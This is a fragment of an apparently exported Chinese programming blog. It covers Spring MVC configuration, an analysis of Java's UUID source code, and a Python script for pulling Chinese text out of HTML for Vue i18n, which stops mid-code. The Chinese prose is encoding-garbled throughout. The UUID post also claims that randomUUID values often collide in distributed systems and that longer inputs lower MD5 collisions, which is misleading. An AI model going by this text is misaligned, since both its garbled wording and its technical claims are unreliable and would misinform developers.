value=".jsp"/&gt;&lt;/bean&gt; é…ç½®å†…éƒ¨èµ„æºåˆ†é…å™¨ã€‚å¯ä»¥é€šè¿‡å±žæ€§æŒ‡å®šwebå·¥ç¨‹æ‰€åœ¨çš„æ¨¡æ¿è§†å›¾çš„è·¯å¾„å‰ç¼€å’Œæ¨¡æ¿æ–‡ä»¶ååŽç¼€ï¼Œå³é€šè¿‡Controlleré‡å®šå‘åˆ°çš„é¡µé¢è·¯å¾„ä¸º/templates/+ æ¨¡æ¿æ–‡ä»¶å + .jspä¾‹å¦‚123456@RequestMapping("/hello")public ModelAndView index(ModelAndView modelAndView)&#123; modelAndView.addObject("name","è“å£«é’¦"); modelAndView.setViewName("index"); return modelAndView;&#125; è¯¥æ–¹æ³•é€šè¿‡modelAndViewçš„addObjectå‘é¡µé¢ä¼ é€’äº†å‚æ•°ånameå’Œå¯¹åº”çš„å‚æ•°å€¼ï¼Œå¹¶ä¸”é€šè¿‡setViewNameæ–¹æ³•æŒ‡å®šæ¨¡æ¿æ–‡ä»¶åï¼Œæ‰€ä»¥è®¿é—®è¯¥æ–¹æ³•æœ€ç»ˆä¼šè¢«è½¬å‘åˆ° /templates/index.jsp è¿™ä¸ªé¡µé¢åœ¨ /templates/ ç›®å½•ä¸‹ åˆ›å»º index.jspï¼Œå¯ä»¥èŽ·å–åˆ°æ–¹æ³•ä¼ è¿‡æ¥çš„å€¼index.jsp123456789&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;SSH&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;Hello $&#123;name&#125;&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; default-servlet-handler1&lt;mvc:default-servlet-handler/&gt; è¯¥é…ç½®ç”¨æ¥æŒ‡å®šDispatcherServletä¸ºé»˜è®¤çš„servletï¼Œå¤„ç†ç¨‹åºå°†æ‰€æœ‰çš„è¯·æ±‚è½¬å‘åˆ°é»˜è®¤å¤„ç†å™¨ï¼Œä¸€å®šè¦é…ç½®è¯¥å¤„ç†ç¨‹åºï¼Œæ‰èƒ½ä½¿å†…éƒ¨èµ„æºåˆ†é…å™¨InternalResourceViewResolverçš„é…ç½®ç”Ÿæ•ˆã€‚å¦‚æžœæ²¡æœ‰è¿™ä¸ªé…ç½®ï¼Œå¼€å‘è€…è§†å›¾è®¿é—®æŽ§åˆ¶å™¨æ‰€è½¬å‘çš„é¡µé¢æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ä¿¡æ¯ org.springframework.web.servlet.DispatcherServlet.noHandlerFound No mapping for GET / â€¦default-servlet-handler çš„æºç ä¸­è¯´æ˜Žå¦‚ä¸‹ï¼š Configures a handler for serving static resources by forwarding to the Servlet containerâ€™s default Servlet.Use of this handler allows using a â€œ/â€œ mapping with the DispatcherServlet while still utilizing the Servletcontainer to serve static resources.This handler will forward all requests to the default Servlet. Therefore it is important that it remains lastin the order of all other URL HandlerMappings. That will be the case if you use the â€œannotation-drivenâ€ elementor alternatively if you are setting up your customized HandlerMapping instance be sure to set its â€œorderâ€property to a value lower than that of the DefaultServletHttpRequestHandler, which is Integer.MAX_VALUE. message-convertersæˆ‘ä»¬ç»å¸¸ä¼šçœ‹åˆ°ä¸€ä¸ªControllerä¸­çš„æ–¹æ³•ä¸Šé¢æ ‡æ³¨äº†ä¸€ä¸ª@ResponseBodyæ³¨è§£ï¼Œç‰¹åˆ«æ˜¯ç»å¸¸ä½¿ç”¨ Spring Boot çš„åŒå­¦ä¼šå‘çŽ°åŠ ä¸Šè¿™ä¸ªæ³¨è§£ä¹‹åŽé€šè¿‡æµè§ˆå™¨è®¿é—®æŽ¥å£ä¼šè¿”å›žJsonæ•°æ®ï¼Œå…¶å®žè¿™æ˜¯ Spring Boot é»˜è®¤æ›¿å¼€å‘è€…é…ç½®äº†æ¶ˆæ¯è½¬æ¢å™¨ã€‚ @ResponseBodyå¯ä»¥è¾“å‡ºJsonæ ¼å¼çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥è¾“å‡ºXMLæ ¼å¼çš„æ•°æ®ï¼Œå…·ä½“è¾“å‡ºä»€ä¹ˆå–å†³äºŽå¯¹æ¶ˆæ¯è½¬æ¢å™¨çš„é…ç½®ã€‚æ¯”å¦‚ä¸‹é¢è¿™æ®µä»£ç 12345678@GetMapping("info")@ResponseBodypublic User info()&#123; User user = new User(); user.setUserName("è“å£«é’¦"); user.setPassWord("xxx"); return user;&#125; åœ¨Spring Boot ä¸­è®¿é—®è¯¥æŽ¥å£ä¼šè¾“å‡ºå¯¹è±¡çš„jsonæ•°æ®1234&#123; "userName": "è“å£«é’¦", "passWord": "123"&#125; ä½†æ˜¯å¦‚æžœæ˜¯éžSpring Boot å·¥ç¨‹ï¼Œæ¯”å¦‚è‡ªå·±ç”¨ Spring MVC æ•´åˆçš„æ¡†æž¶ä¸­ï¼Œå¦‚æžœæ²¡æœ‰å¯¹æ¶ˆæ¯è½¬æ¢å™¨è¿›è¡Œé…ç½®ï¼Œé‚£ä¹ˆ Spring MVC é»˜è®¤å°†ä¸ä¼šå¯¹@ResponseBodyæ³¨è§£è¿›è¡Œè§£æžï¼Œæœ€ç»ˆä¼šå‡ºçŽ°404 - Not Found æ‰€ä»¥æˆ‘ä»¬éœ€è¦é…ç½®æ¶ˆæ¯è½¬æ¢å™¨1234567&lt;!-- é…ç½®æ¶ˆæ¯è§†å›¾è½¬æ¢ --&gt;&lt;mvc:annotation-driven&gt; &lt;mvc:message-converters&gt; &lt;bean class="org.springframework.http.converter.StringHttpMessageConverter"/&gt; &lt;bean class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"/&gt; &lt;/mvc:message-converters&gt;&lt;/mvc:annotation-driven&gt; ç”±äºŽä¸Šé¢é…ç½®äº†Jsonä¿¡æ¯æ˜ å°„ï¼Œè€ŒSpringæœ¬èº«å¹¶æ²¡æœ‰å®žçŽ°jsonå¤„ç†ï¼Œå¦‚æžœæ²¡æœ‰æ·»åŠ jsonç›¸å…³çš„ä¾èµ–åº“ï¼Œé‚£ä¹ˆå°†ä¼šåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­å‡ºçŽ°org.springframework.web.servlet.FrameworkServlet.initServletBean Context initialization failedï¼Œå¹¶ä¸”è¾“å‡º RequestMappingHandlerAdapterè¿™ä¸ªBeanåˆ›å»ºå¤±è´¥çš„ä¿¡æ¯ã€‚ æ‰€ä»¥ä¸€å®šè¦è®°å¾—åœ¨pom.xmlä¸­æ·»åŠ jsonå¤„ç†çš„ä¾èµ–åº“12345678910111213&lt;!-- æ·»åŠ  jackson-core ä¾èµ– --&gt;&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt;&lt;/dependency&gt;&lt;!-- æ·»åŠ  jackson-databind ä¾èµ– --&gt;&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt;&lt;/dependency&gt; é¡¹ç›®æ¡†æž¶å°†æŒç»­é›†æˆå’Œæ›´æ–°ï¼ŒGitHubï¼šhttps://github.com/lanshiqin/ssh-framework]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­£ç¡®çš„ä½¿ç”¨UUID]]></title>
    <url>%2Fcfcd1d83%2F</url>
    <content type="text"><![CDATA[é¡¹ç›®ä¸­å‡ºçŽ°å¤šæ¬¡å–åˆ°é‡å¤UUIDçš„æƒ…å†µï¼Œå¯¼è‡´ä½¿ç”¨UUIDä½œä¸ºæ•°æ®åº“ä¸»é”®çš„è®°å½•å› ä¸ºå­˜åœ¨ç›¸åŒidæ’å…¥å¤±è´¥ã€‚é€ æˆè¿™ä¸ªé—®é¢˜çš„æ ¹æœ¬åŽŸå› æ˜¯å› ä¸ºä½¿ç”¨äº†é”™è¯¯çš„UUIDç”Ÿæˆç­–ç•¥ã€‚å‘çŽ°ä»£ç ä¸­ä½¿ç”¨ UUID.randomUUID()è¿™ä¸ªæ–¹æ³•æ¥å–å¾—UUIDï¼Œç”¨è¿™ä¸ªæ–¹æ³•å–åˆ°çš„UUIDæ˜¯æœ‰å¯èƒ½é‡å¤çš„ã€‚å› ä¸ºè¿™ä¸ªå–UUIDçš„ç­–ç•¥æ˜¯éšæœºæ•°ç­–ç•¥ï¼Œç›®å‰è®¡ç®—æœºä¸­äº§ç”Ÿçš„éšæœºæ•°éƒ½æ˜¯ä¼ªéšæœºæ•°ã€‚ ç‰¹æ„æŸ¥é˜…äº†ä¸€ä¸‹ç½‘ä¸Šå…³äºŽUUIDçš„ç¤ºä¾‹æ–‡ç« ï¼Œå¾ˆå¤šéƒ½æ˜¯ä»‹ç»äº†ä¸€å †UUIDçš„æ¦‚å¿µï¼šæ ¹æ®å…¨å±€çš„æœºå™¨è¯†åˆ«ç ã€ç½‘å¡MACåœ°å€å’Œæ—¶é—´æˆ³æ¥ç”ŸæˆUUIDï¼Œæœ€åŽä½¿ç”¨æ–¹æ³•çš„æ—¶å€™å¾ˆä¸è´Ÿè´£ä»»çš„ç”¨äº†ä¸€ä¸ªUUID.randomUUID()æ–¹æ³•æ¥å–UUIDï¼Œè¿™æ ·å–åˆ°çš„UUIDæ ¹æœ¬å°±ä¸åŒ…å«ç½‘å¡MACåœ°å€å’Œæ—¶é—´æˆ³è¿™äº›ä¿¡æ¯ï¼Œè¿™ç§æ–¹å¼ç”Ÿæˆçš„UUIDæ˜¯éšæœºæ•°ï¼Œæ˜¯æœ‰å¯èƒ½é‡å¤çš„ã€‚ å¸¸è§çš„ä½¿ç”¨æ–¹å¼ç½‘ä¸Šå¾ˆå¤šæ–‡ç« é‡Œï¼ŒèŽ·å–UUIDçš„æ–¹å¼:1UUID.randomUUID().toString() ä»¥ä¸‹æ˜¯UUIDç±»çš„æºç ï¼ŒrandomUUIDæ–¹æ³•çš„å®žçŽ° randomUUID()æºç 12345678910111213141516171819/** * Static factory to retrieve a type 4 (pseudo randomly generated) UUID. * * The &#123;@code UUID&#125; is generated using a cryptographically strong pseudo * random number generator. * * @return A randomly generated &#123;@code UUID&#125; */public static UUID randomUUID() &#123; SecureRandom ng = Holder.numberGenerator; byte[] randomBytes = new byte[16]; ng.nextBytes(randomBytes); randomBytes[6] &amp;= 0x0f; /* clear version */ randomBytes[6] |= 0x40; /* set to version 4 */ randomBytes[8] &amp;= 0x3f; /* clear variant */ randomBytes[8] |= 0x80; /* set to IETF variant */ return new UUID(randomBytes);&#125; é€šè¿‡æºç å’Œæ³¨é‡Šå¯ä»¥çŸ¥é“randomUUIDè¿™ä¸ªé™æ€æ–¹æ³•ä½¿ç”¨äº†éšæœºæ•°çš„ç­–ç•¥æ¥ç”ŸæˆUUIDã€‚randomUUIDæ–¹æ³•å†…ä½¿ç”¨SecureRandomç±»æä¾›äº†å¼ºåŠ å¯†çš„éšæœºæ•°ç”Ÿæˆã€‚åœ¨SecureRandomç±»çš„æºç æ³¨é‡Šä¸­æä¾›äº†ä¸€ä¸ªç½‘å€http://www.ietf.org/rfc/rfc1750.txt æå‡ºäº†å…³äºŽå¼ºåŠ å¯†ç”Ÿæˆéšæœºæ•°çš„å®žçŽ°è€ƒé‡å’Œå…·ä½“ç»†èŠ‚ã€‚ç›®å‰åˆ†æžçš„æ˜¯JDK1.8çš„æºç ï¼Œç›¸æ¯”ä¹‹å‰ç‰ˆæœ¬åšäº†ä¸€äº›å¾®å°çš„æ”¹è¿›ï¼Œæœ‰å…³SecureRandoméšæœºæ•°çš„ç”Ÿæˆæ–¹å¼çš„å…·ä½“å®žçŽ°å¯ä»¥è‡ªè¡Œé˜…è¯»æºç ã€‚randomUUIDæ–¹æ³•æœ€åŽå°†ç”Ÿæˆå¥½çš„16ä½éšæœºæ•°å­—èŠ‚æ•°ç»„ä¼ ç»™UUIDæž„é€ å‡½æ•°UUID(byte[] data)è¿›è¡Œæœ‰æ•ˆä½è®¡ç®— UUID(byte[] data)æºç 12345678910111213141516// Constructors and Factories/* * Private constructor which uses a byte array to construct the new UUID. */private UUID(byte[] data) &#123; long msb = 0; long lsb = 0; assert data.length == 16 : "data must be 16 bytes in length"; for (int i=0; i&lt;8; i++) msb = (msb &lt;&lt; 8) | (data[i] &amp; 0xff); for (int i=8; i&lt;16; i++) lsb = (lsb &lt;&lt; 8) | (data[i] &amp; 0xff); this.mostSigBits = msb; this.leastSigBits = lsb;&#125; UUID(byte[] data)æž„é€ å‡½æ•°æ ¹æ®ä¼ å…¥çš„å­—èŠ‚æ•°ç»„è¿›è¡Œæœ‰æ•ˆä½è®¡ç®—ï¼Œå°†å‰8ä¸ªå­—èŠ‚èµ‹å€¼ç»™é«˜64ä½mostSigBitsï¼ŒåŽ8ä¸ªå­—èŠ‚èµ‹å€¼ç»™ä½Ž64ä½leastsigbitsï¼Œç»„åˆæˆå®Œæ•´çš„UUIDé•¿åº¦ä¸º(64+64)128ä½ã€‚ å¯ä»¥å‘çŽ°é€šè¿‡randomUUIDæ–¹å¼èŽ·å–UUIDçš„æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯å¯¹å–åˆ°çš„éšæœºæ•°è¿›è¡Œè®¡ç®—ï¼Œæ ¹æœ¬æ²¡æœ‰ç½‘ä¸ŠæŸäº›æ–‡ç« æ‰€è¯´çš„æ ¹æ®ç½‘å¡MACåœ°å€å’Œæ—¶é—´æˆ³è¿›è¡Œç”Ÿæˆã€‚é€šè¿‡UUID.randomUUID().toString()ç”Ÿæˆçš„UUIDæ ¼å¼å¦‚ä¸‹11f1fa8ea-06fe-4bdf-a0cb-e0fe7baca34c ä¹‹æ‰€ä»¥è¾“å‡ºè¿™ç§æ ¼å¼ï¼Œæ˜¯å› ä¸ºè°ƒç”¨äº†UUIDä¸­çš„toStringæ–¹æ³•ï¼Œè¯¥æ–¹æ³•é€šè¿‡-ç¬¦å·å°†UUIDæœ€ç»ˆçš„å€¼åˆ†ä¸º5æ®µç»„åˆï¼Œå‰3æ®µåˆ†åˆ«ä¸ºï¼šé«˜64ä½å³ç§»32å–8ä½16è¿›åˆ¶å­—ç¬¦ä¸²æ‹¼æŽ¥-ï¼Œé«˜64ä½å³ç§»16ä½å–4ä½16è¿›åˆ¶å­—ç¬¦ä¸²æ‹¼æŽ¥-,é«˜64ä½å–4ä½16è¿›åˆ¶å­—ç¬¦ä¸²æ‹¼æŽ¥-ï¼ŒåŽ2æ®µåˆ†åˆ«æ˜¯ï¼šä½Ž64ä½å³ç§»48å–4ä½16è¿›åˆ¶å­—ç¬¦ä¸²æ‹¼æŽ¥-ï¼Œä½Ž64ä½å–12ä½16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ UUID toString()1234567public String toString() &#123; return (digits(mostSigBits &gt;&gt; 32, 8) + "-" + digits(mostSigBits &gt;&gt; 16, 4) + "-" + digits(mostSigBits, 4) + "-" + digits(leastSigBits &gt;&gt; 48, 4) + "-" + digits(leastSigBits, 12));&#125; æœ€ç»ˆæ•´ä¸ªå®Œæ•´çš„å€¼é•¿åº¦ä¸º8-4-4-4-12ï¼ŒåŽ»æŽ‰-ç¬¦å·ï¼Œå°±æ˜¯ç½‘ä¸Šå¸¸è¯´çš„32ä½16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚å¾ˆå¤šæ—§çš„é¡¹ç›®å·¥ç¨‹ä¸­ä¹Ÿå¾ˆä¹ æƒ¯æ€§çš„é‡‡ç”¨UUID.randomUUID().toString()è¿™ç§æ–¹å¼åŽ»èŽ·å–UUIDï¼Œé€šè¿‡UUIDç±»çš„é™æ€æ–¹æ³•å–å€¼ç¡®å®žå†™èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯å¦‚æžœåº”ç”¨åœ¨åˆ†å¸ƒå¼é›†ç¾¤ç­‰éœ€è¦ä½œä¸ºè®°å½•å‡­æ®çš„å”¯ä¸€æ€§æ—¶å°±æœ‰å¯èƒ½å‡ºçŽ°é—®é¢˜ï¼Œå› ä¸ºrandomUUID()æ–¹æ³•å–åˆ°çš„UUIDæ— æ³•ä¿è¯å…¨å±€å”¯ä¸€æ€§ã€‚ UUIDçš„å®šä¹‰UUIDå…¨ç§°:Universally Unique Identifierï¼Œé€šç”¨å”¯ä¸€è¯†åˆ«ç ã€‚åœ¨JDKä¸­UUIDæœ‰4ç§ä¸åŒçš„ç­–ç•¥å®žçŽ° JDKä¸­çš„UUIDç­–ç•¥å®žçŽ°é€šè¿‡é˜…è¯»UUIDæºä»£ç ï¼Œå¹¶ä¸”ä»ŽUUIDç±»ä¸Šçš„æ³¨é‡Šå¯çŸ¥1234* &lt;p&gt; The version field holds a value that describes the type of this &#123;@code* UUID&#125;. There are four different basic types of UUIDs: time-based, DCE* security, name-based, and randomly generated UUIDs. These types have a* version value of 1, 2, 3 and 4, respectively. åœ¨JDKçš„UUIDç±»ä¸­æœ‰å››ç§ä¸åŒçš„å®žçŽ°ç±»åž‹ï¼šåŸºäºŽæ—¶é—´ã€åŸºäºŽDCEå®‰å…¨ã€åŸºäºŽåå­—ï¼ŒåŸºäºŽéšæœºæ•°ã€‚æ–‡ç« å¼€å¤´æåˆ°çš„å°±æ˜¯ç¬¬4ç§ï¼ŒåŸºäºŽéšæœºæ•°çš„ç±»åž‹ã€‚è¿™ç§ç”Ÿæˆæ–¹å¼åœ¨å¤§ä¸€ç‚¹çš„åˆ†å¸ƒå¼çŽ¯å¢ƒä¸‹å–åˆ°é‡å¤å€¼çš„æ¦‚çŽ‡æ˜¯å¾ˆå¤§çš„ã€‚ä¸‹é¢æ¥å…·ä½“åˆ†æžä¸€ä¸‹ç›®å‰JDKä¸­4ä¸­ä¸åŒçš„UUIDç”Ÿæˆæ–¹å¼åŒºåˆ« UUID1 åŸºäºŽæ—¶é—´æˆ³12 UUID2 åŸºäºŽDCEå®‰å…¨12 UUID3 åŸºäºŽåå­—12UUID uuid3 = UUID.nameUUIDFromBytes("è“å£«é’¦".getBytes());System.out.println(uuid3.toString()); nameUUIDFromBytesæºç å¦‚ä¸‹ï¼š1234567891011121314151617181920212223/** * Static factory to retrieve a type 3 (name based) &#123;@code UUID&#125; based on * the specified byte array. * * @param name * A byte array to be used to construct a &#123;@code UUID&#125; * * @return A &#123;@code UUID&#125; generated from the specified array */public static UUID nameUUIDFromBytes(byte[] name) &#123; MessageDigest md; try &#123; md = MessageDigest.getInstance("MD5"); &#125; catch (NoSuchAlgorithmException nsae) &#123; throw new InternalError("MD5 not supported", nsae); &#125; byte[] md5Bytes = md.digest(name); md5Bytes[6] &amp;= 0x0f; /* clear version */ md5Bytes[6] |= 0x30; /* set to version 3 */ md5Bytes[8] &amp;= 0x3f; /* clear variant */ md5Bytes[8] |= 0x80; /* set to IETF variant */ return new UUID(md5Bytes);&#125; å¯ä»¥çœ‹åˆ°è¿™ç§ç­–ç•¥æ˜¯å°†ä¼ å…¥çš„åå­—æ•°ç»„è¿›è¡ŒMD5è®¡ç®—å¾—åˆ°ä¸€ä¸ªMD5æ•°ç»„å€¼ï¼Œç„¶åŽå†å°†å¾—åˆ°çš„å€¼è¿›è¡Œé«˜ä½Žä½è®¡ç®—å¾—åˆ°UUIDã€‚æƒ³è¦ç”Ÿæˆçš„IDä¸åŒï¼Œä¼ å…¥çš„nameå°±å¿…é¡»ä¸åŒã€‚ ä¸¤æ®µä¸åŒå†…å®¹çš„å­—ç¬¦ä¸²ï¼Œå¯èƒ½ä¼šäº§ç”Ÿç›¸åŒçš„MD5å€¼ï¼Œä¿—ç§°çš„MD5ç¢°æ’žã€‚æ‰€ä»¥è¿™é‡Œä¼ å…¥çš„nameå€¼è¶Šé•¿ï¼Œå†…å®¹è¶Šå¤šï¼Œäº§ç”Ÿç¢°æ’žçš„æ¦‚çŽ‡è¶Šå°ã€‚ UUID4 åŸºäºŽéšæœºæ•°12]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¿å…æ— ç”¨çš„é‡å¤åŠ³åŠ¨åŠ›]]></title>
    <url>%2F7c398525%2F</url>
    <content type="text"><![CDATA[é‡åˆ°è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦å°†æ—§ç³»ç»Ÿä¸­çš„å‡ åä¸ªé¡µé¢åšå›½é™…åŒ–ã€‚ç”±äºŽä¹‹å‰æ˜¯å†™æ­»ä¸­æ–‡ï¼Œæ‰€ä»¥éœ€è¦è€—è´¹å¤§é‡çš„å·¥ä½œå°†ç³»ç»Ÿä¸­çš„ä¸­æ–‡å…¨éƒ¨æå–å‡ºæ¥åšç¿»è¯‘å·¥ä½œã€‚äººå·¥æŸ¥æ‰¾ä¸ä»…è´¹æ—¶è´¹åŠ›ï¼Œè€Œä¸”è¿˜æœ‰å¯èƒ½å‡ºçŽ°é—æ¼ã€‚ç«™åœ¨å¼€å‘è€…çš„è§’åº¦æ€è€ƒé—®é¢˜ï¼Œæˆ‘ä»¬åº”è¯¥æŠŠæŠ½è±¡çš„é—®é¢˜å…·ä½“åŒ–ï¼Œå¹¶ä¸”å°†å¯è¡Œçš„æ–¹æ¡ˆç”¨ç¨‹åºå®žçŽ°ï¼Œå°†é‡å¤å·¥ä½œäº¤ç»™è®¡ç®—æœºåŽ»åšï¼Œä¸‹æ¬¡é‡åˆ°åŒæ ·çš„é—®é¢˜å°±å¯ä»¥ç›´æŽ¥ä½¿ç”¨ä¸Šæ¬¡çš„å·¥å…·ï¼Œé¿å…é‡å¤æ— ç”¨çš„åŠ³åŠ¨åŠ›ã€‚ åŽŸå§‹éœ€æ±‚åˆ†æžç³»ç»Ÿéœ€è¦åšå›½é™…åŒ–ï¼Œæ¶‰åŠçš„å·¥ç¨‹æ¨¡å—æ¯”è¾ƒå¤šï¼Œéœ€è¦å°†æ¯ä¸ªhtmlé¡µé¢ä¸­å†™æ­»çš„ä¸­æ–‡ä¿®æ”¹æˆå›½é™…åŒ–æ”¯æŒã€‚è¦æ‰¾å‡ºæ‰€æœ‰é¡µé¢çš„ä¸­æ–‡ï¼Œå°†ä¸­æ–‡ç½—åˆ—å‡ºæ¥äº¤ç»™ä¸“ä¸šäººå£«è¿›è¡Œä¸€ä¸€å¯¹åº”çš„ç¿»è¯‘ï¼Œç¿»è¯‘åŽè¦é€ä¸ªæ›¿æ¢ä¸ºå›½é™…åŒ–æ”¯æŒçš„è¡¨è¾¾å¼ï¼Œå…¶ä¸­çš„é”®ååœ¨ç¿»è¯‘å‰å°±éœ€è¦ç¡®å®šã€‚ä¸»è¦çš„ä½“åŠ›åŠ³åŠ¨åœ¨äºŽæ‰¾å‡ºæ‰€æœ‰çš„ä¸­æ–‡å’Œæ›¿æ¢æŽ‰æ‰€æœ‰çš„ä¸­æ–‡ä¸ºè¡¨è¾¾å¼çš„æ“ä½œã€‚ é—®é¢˜å…·ä½“åŒ–ç›®å‰ç³»ç»Ÿé¡µé¢çš„å†™æ³•ï¼šä¸­æ–‡å†…å®¹å†™æ­»åœ¨htmlä¸­1234567891011121314151617&lt;html&gt; &lt;head&gt; &lt;title&gt;vue-demo&lt;/title&gt; &lt;script src="vue.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- Vueç¤ºä¾‹ --&gt; &lt;div id="app"&gt; &lt;p&gt;ä¸­æ–‡å†…å®¹&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; new Vue(&#123; el: '#app' &#125;); &lt;/script&gt;&lt;/html&gt; ä½¿ç”¨VueI18nå›½é™…åŒ–çš„å†™æ³•ï¼šä¸åŒè¯­ç§å¯¹åº”çš„è¯ä½¿ç”¨ç›¸åŒçš„é”®åï¼Œé¡µé¢æ ¹æ®é”®åå–å€¼ï¼Œå€¼å†…å®¹ç”±è¯­è¨€çŽ¯å¢ƒå†³å®š123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt; &lt;head&gt; &lt;title&gt;vue-i18n-demo&lt;/title&gt; &lt;script src="vue.min.js"&gt;&lt;/script&gt; &lt;script src="vue-i18n.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt; &lt;!-- æ ¹æ®é”®åè¾“å‡ºå€¼ --&gt; &lt;p&gt;&#123;&#123; $t("message.title") &#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; // æ¶ˆæ¯å®šä¹‰ï¼Œä¸€èˆ¬å°†ä¸åŒè¯­ç§åˆ†åˆ«æ”¾ç½®åˆ°ä¸åŒçš„æ–‡ä»¶ä¸­ const messages = &#123; en: &#123; message: &#123; title: 'English Content' &#125; &#125;, cn: &#123; message: &#123; title: 'ä¸­æ–‡å†…å®¹' &#125; &#125; &#125;; // VueI18n å®žä¾‹ï¼Œè®¾ç½®å½“å‰è¯­è¨€çŽ¯å¢ƒå’Œæ¶ˆæ¯å¯¹è±¡ const i18n = new VueI18n(&#123; locale: 'en', messages: messages, &#125;); new Vue(&#123; el: '#app', i18n: i18n &#125;); &lt;/script&gt;&lt;/html&gt; åœ¨å®žé™…ä½¿ç”¨ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬å°†ä¸åŒçš„è¯­ç§æ”¾ç½®åˆ°ä¸åŒçš„æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªè¯­ç§éƒ½å¯ä»¥è¯·ç›¸å…³ä¸“ä¸šçš„äººè¿›è¡Œç¿»è¯‘ã€‚ç³»ç»Ÿä½¿ç”¨æ—¶å†è·Ÿè¿›è¯­è¨€çŽ¯å¢ƒåŠ è½½ä¸åŒçš„è¯­è¨€åŒ…æ–‡ä»¶ï¼Œè¿™ç‚¹å’ŒAndroid Appç­‰ç§»åŠ¨å¼€å‘ç±»ä¼¼ï¼Œä¹Ÿæ˜¯é‡‡ç”¨è¿™ç§æ–¹æ¡ˆã€‚ å®žçŽ°æ–¹æ¡ˆ1.å°†å·¥ç¨‹ä¸‹æ‰€æœ‰çš„htmlé¡µé¢ä¸­çš„æ‰€æœ‰ä¸­æ–‡æå–åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆæå–å†…å®¹è¦å¿½ç•¥æŽ‰ä»£ç ä¸­çš„æ³¨é‡Šæ–‡ä»¶ï¼‰2.å°†æå–å‡ºæ¥çš„ä¸­æ–‡åšç¿»è¯‘å·¥ä½œï¼ˆå¯ä»¥äº¤ç»™ä¸“ä¸šäººå£«ç¿»è¯‘ï¼‰ï¼Œæ¯ä¸ªè¯­ç§å¯¹åº”ç”Ÿæˆä¸€ä¸ªjsè¯­è¨€å˜é‡æ–‡ä»¶ã€‚ 1234const en = &#123; ç®€ä½“ä¸­æ–‡æ ‡é¢˜: 'English Title', ç®€ä½“ä¸­æ–‡å†…å®¹: 'English Content',&#125; å…¶ä¸­jså˜é‡æ–‡ä»¶ä¸­è‡ªåŠ¨ç”Ÿæˆå¥½é»˜è®¤çš„é”®,æ ¹æ®æºä»£ç ä¸­å¼€å‘è€…å†™æ­»çš„ä¸­æ–‡ä½œä¸ºé”®çš„å¥½å¤„æ˜¯ç¿»è¯‘äººå‘˜å¯ä»¥æ˜Žç¡®è¦ç¿»è¯‘çš„å†…å®¹ï¼Œç¿»è¯‘åŽæŠŠå¯¹åº”çš„å€¼èµ‹å€¼ä¸Šå³å¯ã€‚ç¨‹åºä¸­ä¹Ÿä»¥å½“å‰å¼€å‘è€…ä¹‹å‰æ‰€å†™çš„è¯­è¨€ä½œä¸ºé”®ï¼ŒçœåŽ»äººå·¥æ¯”å¯¹ç¿»è¯‘é”®å€¼å¯¹çš„æ“ä½œã€‚ 3.å°†htmlçš„ä¸­æ–‡æ›¿æ¢ä¸ºVueI18næ¨¡æ¿è¡¨è¾¾å¼ï¼Œå˜é‡å€¼ä¸ºè¯­è¨€æ–‡ä»¶ä¸­å¯¹åº”çš„é”® åšå®Œä¸Šè¿°å·¥ä½œåŽå°±å¯ä»¥æ ¹æ®è¯­è¨€çŽ¯å¢ƒçš„åˆ‡æ¢è‡ªåŠ¨åŠ è½½ä¸åŒçš„è¯­è¨€æ–‡ä»¶ï¼Œé¡µé¢ä¸Šçš„æ–‡å­—å€¼æ˜¾ç¤ºçš„ä¸ºå¯¹åº”jsè¯­è¨€æ–‡ä»¶ä¸­çš„å€¼ã€‚ ç¼–ç å®žçŽ°ç¬¬ä¸€æ­¥ï¼šæå–ä¸­æ–‡åˆ°æŒ‡å®šæ–‡ä»¶ TextUtils.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import osimport re__author__ = 'è“å£«é’¦'# èŽ·å–æŒ‡å®šç›®å½•ä¸‹æŒ‡å®šåŽç¼€çš„æ–‡ä»¶å…¨è·¯å¾„åï¼Œè¿”å›žæ•°ç»„def get_file_path_list(path, find_suffix): files = os.listdir(path) # å¾—åˆ°æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åç§° s = [] for file in files: # éåŽ†æ–‡ä»¶å¤¹ if os.path.splitext(file)[1] == find_suffix: s.append(path + "/" + file) return s# è¯»å–æ–‡ä»¶,æ ¹æ®åŒ¹é…è§„åˆ™æŸ¥æ‰¾ç›®æ ‡ï¼Œè¾“å‡ºåˆ°æŒ‡å®šæ–‡ä»¶def read_file_match_out(match_rule, exclude_rule, file_path_list, write_file): out_file = open(write_file, "w") for file_obj in file_path_list: file = open(file_obj, 'r') line 